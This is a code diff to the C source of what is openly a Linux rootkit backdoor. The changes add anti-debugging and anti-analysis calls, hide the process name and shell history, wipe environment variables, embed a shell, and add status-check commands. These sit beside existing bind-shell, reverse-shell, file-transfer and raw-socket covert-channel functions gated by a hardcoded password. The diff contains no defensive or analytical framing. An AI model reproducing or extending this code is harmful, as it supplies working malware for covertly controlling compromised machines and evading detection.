@@ -15,6 +15,7 @@
 #include <sys/wait.h>
 #include <termios.h>
 #include <netdb.h>
+#include <sys/ptrace.h>
 
 #include "raw.h"
 #include "config.h"
@@ -22,11 +23,24 @@
 #include "antidebug.h"
 #include "rc4.h"
 
+int simple_anti_spkd = 1;
+
 int weekday;
 struct rawsock rawsocks[MAXRAWSESSIONS];
 rc4_ctx rc4_crypt, rc4_decrypt;
+extern char **environ;
+extern int dash_main(int, char **);
 
-char *envp[] = {
+char *dash_envp[] = {
+     "TERM=linux",
+     "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# ",
+     "HISTFILE=/dev/null",
+     "HOME=" HOME,
+     "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" HOME ":" HOME "/bin",
+     NULL
+};
+
+char *bash_envp[] = {
      "TERM=linux",
      "SHELL=/bin/sh",
      "BASH_ENV=/dev/null",
@@ -35,6 +49,11 @@ char *envp[] = {
      "HOME=" HOME,
      "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" HOME ":" HOME "/bin",
      NULL
+};
+
+char  *argv_dash[] = {
+      PROCNAME,
+      NULL
 };
 
 char  *argv_bash[] = {
@@ -48,6 +67,7 @@ char  *argv_bash[] = {
 
 // TODO: Use network check method
 int im_running(){
+	antidebug_obfuscate_analysis(3);
     if (0) {
         debug("I'm running!!!");
         return 1;
@@ -55,9 +75,18 @@ int im_running(){
     return 0;
 }
 
+void clearEnv() {
+	antidebug_obfuscate_analysis(4);
+
+    int i;
+    for (i=0; environ[i]; i++) 
+	    memset(environ[i], 0, strlen(environ[i]));
+}
+
 // Cron function
 #if CRON
 void cron(int n) {
+	antidebug_obfuscate_analysis(5);
     char buffer[256];
 
     debug("Executant el cron daily\n");
@@ -84,9 +113,18 @@ void cron(int n) {
 }
 #endif
 
+void check_already_running() {
+    if (system("grep -q '6: 00000000:0006 00000000:0000 07' /proc/net/raw") == 0){
+        debug("I'm already running!!!\n");
+        exit(-1);
+    }
+}
+
 void rename_proc(char **argv, int argc) {
+	antidebug_obfuscate_analysis(6);
     int i;
     for (i = 0; i < argc; i++) {
+        memset(argv[i], 0, strlen(argv[i]));
         realloc(argv[i], strlen(PROCNAME)+1);
         memcpy(argv[i], PROCNAME, strlen(PROCNAME)+1);
     }
@@ -127,6 +165,7 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     if (ptr) { ptr++;}
     else { ptr = file; }
 
+	antidebug_obfuscate_analysis(7);
     fd = open(file, O_RDONLY);
     if (fd < 0){
         debug("Error openning file %s\n", file);
@@ -156,6 +195,8 @@ int launcher_rcon(unsigned long ip, unsigned short port) {
     sock = socket(AF_INET, SOCK_STREAM, 6);
     if (sock < 0) exit(-1);
 
+	antidebug_obfuscate_analysis(8);
+
     memset(&cli, 0, sizeof(cli));
     cli.sin_family = AF_INET;
     cli.sin_port = htons(port);
@@ -177,6 +218,8 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     char file_path[256];
     struct timeval tv;
     int nfd = 0;
+
+	antidebug_obfuscate_analysis(9);
 
     rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
 
@@ -206,6 +249,8 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
         FD_ZERO(&fds);
         FD_SET(sockr, &fds);
 
+		antidebug_obfuscate_analysis(10);
+
         nfd = select(sockr + 1, &fds, NULL, NULL, &tv);
         if (nfd == 0) break;
         else if (nfd > 0 && FD_ISSET(sockr, &fds)) {
@@ -226,6 +271,15 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     close(fd);
 }
 
+void launcher_check(int sockr, int sockw) {
+	antidebug_obfuscate_analysis(18);
+
+	write(sockw, CHECKSTR, sizeof(CHECKSTR));
+	sleep(1);
+	close(sockr);
+	close(sockw);	
+}
+
 void launcher_shell(int sockr, int sockw) {
     int tty, pty, subshell;
     unsigned char buf[BUFSIZE];
@@ -240,6 +294,8 @@ void launcher_shell(int sockr, int sockw) {
     grantpt(pty);
     unlockpt(pty);
     tty = open(ptsname(pty), O_RDWR);
+
+	antidebug_obfuscate_analysis(11);
 
     // child
     if(!(subshell = fork())) {
@@ -261,15 +317,21 @@ void launcher_shell(int sockr, int sockw) {
         dup2(tty, 2);
         close(tty);
 
+		antidebug_obfuscate_analysis(12);
         if (getuid()) chdir("/var/tmp");
         else chdir(HOME);
-        
-        execve("/bin/bash", argv_bash, envp);
-        execve("/usr/local/bin/bash", argv_bash, envp);
+       
+#if INCLUDE_SHELL
+		// TODO: Setup USER and HOME environtment variable
+		putenv("PS1=\033[1;30m[\033[0;32m$USER\033[1;32m@\033[0;32m$HOST \033[1;37m$PWD\033[1;30m]\033[0m# ");
+		dash_main(1, argv_dash);
+#else		
+        execve("/bin/bash", argv_bash, bash_envp);
+        execve("/usr/local/bin/bash", argv_bash, bash_envp);
         execl("/bin/ksh", "ksh", "-i", NULL);
         execl("/usr/local/bin/ksh", "ksh", "-i", NULL);
         execl("/usr/local/bin/csh", "csh", "-i", NULL);
-
+#endif
         // we should not to be here
         exit(1);
     }
@@ -291,6 +353,7 @@ void launcher_shell(int sockr, int sockw) {
             FD_SET(sockr, &fds);
             FD_SET(pty, &fds);
 
+			antidebug_obfuscate_analysis(13);
             if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
 
             /* shell => client */
@@ -343,16 +406,16 @@ void launcher_shell(int sockr, int sockw) {
 
 void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     struct rawsock *r;
-    antidebug3();
+	antidebug_obfuscate_analysis(14);
     switch(d->action) {
         case UPLOAD:
-            antidebug3();
             debug("Uploading file\n");
             if (!getuid()) {
                 debug("Can not transfer files using direct RAW\n");
                 r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
     			if (fork()) return;
                 launcher_upload(r->r[0], r->w[1], (char *)d->bytes, d->size);
+				destroy_rawsock_session(r);
             } else {
     			if (fork()) return;
                 launcher_upload(sock, sock, (char *)d->bytes, d->size);
@@ -372,7 +435,6 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     			if (fork()) return;
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
-                antidebug3();
             }
             break;
         case SHELL:
@@ -383,10 +445,23 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     			if (fork()) return;
                 launcher_shell(r->r[0], r->w[1]);
 				destroy_rawsock_session(r);
-                antidebug3();
             } else {
     			if (fork()) return;
                 launcher_shell(sock, sock);
+                close(sock);
+            }
+            break;
+        case CHECK:
+            debug("Checking for the rootkit\n");
+            if (!getuid()) {
+                debug("Starting DirectRAW service\n");
+                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+    			if (fork()) return;
+                launcher_check(r->r[0], r->w[1]);
+				destroy_rawsock_session(r);
+            } else {
+    			if (fork()) return;
+                launcher_check(sock, sock);
                 close(sock);
             }
             break;
@@ -408,10 +483,17 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
             break;
         case REVSHELL:
     		if (fork()) return;
-            antidebug3();
             debug("Launching reverse shell\n");
             if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_shell(sock, sock);
+                close(sock);
+            }
+            break;
+        case REVCHECK:
+    		if (fork()) return;
+            debug("Checking for the rootkit in reverse mode\n");
+            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
+                launcher_check(sock, sock);
                 close(sock);
             }
             break;
@@ -423,7 +505,6 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
             break;
         case STOPRAWSESSION:
             debug("Client destroyed the rawsocksession\n");
-            antidebug3();
             r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
 			destroy_rawsock_session(r);	
             return;
@@ -448,7 +529,6 @@ void tcp_daemon(int port) {
         exit(-1);
     }
 
-    antidebug3();
     memset((char *) &tcp, 0, sizeof(tcp));
     tcp.sin_family = AF_INET;
     tcp.sin_addr.s_addr = htonl(INADDR_ANY);
@@ -468,6 +548,8 @@ void tcp_daemon(int port) {
         exit(-1);
     }
 
+	antidebug_obfuscate_analysis(15);
+
     debug("Listening to port %d\n", port);
     while (1) {
         sock_con = accept(sock, (struct sockaddr *) &cli, &slen);
@@ -483,6 +565,9 @@ void tcp_daemon(int port) {
             }
             if (!memcmp(CLIENTAUTH, d.pass, 20)) {
                 debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", d.action);
+                do_action(&d, &tcp.sin_addr, 0, sock_con);
+            } else if (!memcmp(CHECKSTR, d.pass, 20) && (d.action == CHECK || d.action == REVCHECK)) {
+                debug("S'ha rebut el paquet de CHECK\n");
                 do_action(&d, &tcp.sin_addr, 0, sock_con);
             }
             exit(-1);
@@ -507,7 +592,7 @@ void raw_daemon() {
         exit(-1);
     }
 
-    antidebug3();
+	antidebug_obfuscate_analysis(16);
 
     while (1) {
         size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
@@ -517,16 +602,23 @@ void raw_daemon() {
             if (!memcmp(CLIENTAUTH, p.action.pass, 20)) {
                 debug("S'ha rebut el paquet d'autenticat (action: %d)\n", p.action.action);
                 do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
-            }
+            } else if (!memcmp(CHECKSTR, p.action.pass, 20) && (p.action.action == CHECK || p.action.action == REVCHECK)) {
+                debug("S'ha rebut el paquet de CHECK\n");
+                do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
+			}
         }
     }
 }
 
+
 int main(int argc, char **argv) {
-    antidebug4(argv[0]);
     int port = 0;
 
-    antidebug3();
+	if (simple_anti_spkd == 0 ) *(int *)port = 0xdeadfeef;
+	simple_anti_spkd = 0;
+
+	antidebug_obfuscate_analysis(17);
+	antidebug_sigtrap()
 
     // Command mode
     if (argc == 3){
@@ -553,18 +645,18 @@ int main(int argc, char **argv) {
     }
 
     // Check if we are running
-
+	check_already_running();
 
     // Change proc name
     rename_proc(argv, argc);
 
     // Daemonize
 #if ! DEBUG
-    antidebug1();
     daemonize();
 #else
     signal(SIGCHLD, sig_child);
 #endif
+    clearEnv();
 
     // Cron
 #if CROND
@@ -576,6 +668,8 @@ int main(int argc, char **argv) {
 #ifdef KEYLOGGER
     debug("Initializing keylogger\n");
 #endif
+
+	antidebug_obfuscate_analysis(2);
 
     // if we can't open a raw socket
     if (getuid() && geteuid()) {
